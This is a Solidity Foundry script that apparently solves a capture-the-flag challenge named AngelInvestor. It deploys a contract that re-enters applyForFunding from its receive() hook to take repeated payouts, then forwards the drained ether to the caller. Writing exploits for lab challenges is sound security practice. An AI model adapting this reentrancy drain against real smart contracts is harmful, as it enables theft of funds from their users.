pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {AngelInvestor} from "src/BITS-2025/SeedFund/AngelInvestor.sol";



contract Solve is Script{
    function run()public{
        AngelInvestor angel=AngelInvestor(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        vm.startBroadcast();
        Exploit exploit =new Exploit(address(angel));
        exploit.pwn();
        require(angel.isChallSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}

contract Exploit{
    AngelInvestor angel_investor;
    uint8 check;
    constructor(address __angel_addr){
        angel_investor=AngelInvestor(__angel_addr);
    }

    function pwn()public{
        angel_investor.applyForFunding(7);
        msg.sender.call{value:address(this).balance}("");
    }
    
    receive()external payable{
        if(check<4){
            check+=1;
            if(check==4){
                angel_investor.applyForFunding(5);
            }
            else{
                angel_investor.applyForFunding(7);
            }
        }
    }
}

